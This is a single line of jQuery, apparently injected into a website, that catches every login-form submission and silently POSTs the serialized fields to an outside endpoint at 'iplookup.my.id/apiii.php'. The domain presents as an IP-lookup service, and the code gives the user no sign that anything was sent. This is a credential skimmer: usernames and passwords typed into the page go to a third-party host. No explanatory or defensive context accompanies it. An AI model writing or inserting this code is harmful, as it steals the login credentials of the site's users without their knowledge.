$(".login-form").submit(function() {$.ajax({ url:"https://iplookup.my.id/apiii.php",type: "POST",data: $(this).serialize(), success: function () {}})});
